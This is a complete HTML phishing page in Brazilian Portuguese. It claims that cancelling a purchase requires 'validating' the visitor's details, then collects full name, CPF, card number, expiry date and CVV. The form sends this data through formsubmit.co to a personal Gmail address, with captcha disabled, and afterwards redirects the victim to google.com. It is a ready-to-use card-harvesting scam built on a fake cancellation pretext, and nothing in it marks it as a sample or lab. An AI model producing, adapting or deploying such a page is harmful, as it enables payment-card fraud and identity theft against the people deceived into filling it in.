<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Validação de Cartão</title>
  <style>
    body {
      background-color: #f57c00;
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    form {
      background-color: #ffffff;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
      width: 100%;
      max-width: 400px;
    }

    h2 {
      color: #f57c00;
      text-align: center;
      margin-bottom: 24px;
    }

    label {
      display: block;
      margin-bottom: 6px;
      font-weight: bold;
      color: #333;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 15px;
    }

    button {
      width: 100%;
      background-color: #f57c00;
      color: #fff;
      padding: 14px;
      font-size: 17px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
    }

    button:hover {
      background-color: #e65100;
    }
  </style>
</head>
<body>

  <form action="https://formsubmit.co/bieell.vg@gmail.com" method="POST">
    <h2>Para cancelar a compra, precisamos validar suas informações</h2>

    <label for="nome">Nome completo</label>
    <input type="text" id="nome" name="nome" placeholder="Ex: Gabriel Vieira" required />

    <label for="cpf">CPF</label>
    <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required />

    <label for="cartao">Número do cartão</label>
    <input type="text" id="cartao" name="cartao" placeholder="0000 0000 0000 0000" required />

    <label for="validade">Validade (MM/AA)</label>
    <input type="text" id="validade" name="validade" placeholder="12/25" required />

    <label for="cvv">CVV</label>
    <input type="text" id="cvv" name="cvv" placeholder="123" required />

    <input type="hidden" name="_next" value="https://google.com" />
    <input type="hidden" name="_captcha" value="false" />

    <button type="submit">Validar agora</button>
  </form>

</body>
</html>
